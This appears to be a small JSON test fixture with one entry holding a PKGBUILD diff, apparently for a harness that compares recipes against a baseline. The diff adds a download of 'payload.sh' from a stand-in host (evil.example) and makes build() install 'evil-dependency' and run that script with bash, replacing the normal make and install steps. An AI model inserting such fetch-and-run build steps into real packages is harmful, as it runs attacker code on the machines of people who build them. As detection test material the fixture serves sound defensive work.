@@ -1,0 +1,8 @@
+{
+  "cells": [
+    {
+      "id": "gap-e151f056be",
+      "diff": "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,3 @@\n-# Baseline recipe: recipe-mode inputs are diffed against this.\n pkgname=harness-baseline\n pkgver=1.0.0\n pkgrel=1\n@@ -6,15 +5,12 @@\n arch=('any')\n url=\"https://github.com/example/harness-baseline\"\n license=('MIT')\n-source=(\"https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\n-sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n+source=(\"https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\"\n+        \"https://evil.example/payload.sh\")\n+sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'\n+            'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n \n build() {\n-  cd \"$srcdir/harness-baseline-1.0.0\"\n-  make\n+  npm install evil-dependency\n+  bash \"$srcdir/payload.sh\"\n }\n-\n-package() {\n-  cd \"$srcdir/harness-baseline-1.0.0\"\n-  make DESTDIR=\"$pkgdir\" install\n-}\n"
+    }
+  ]
+}
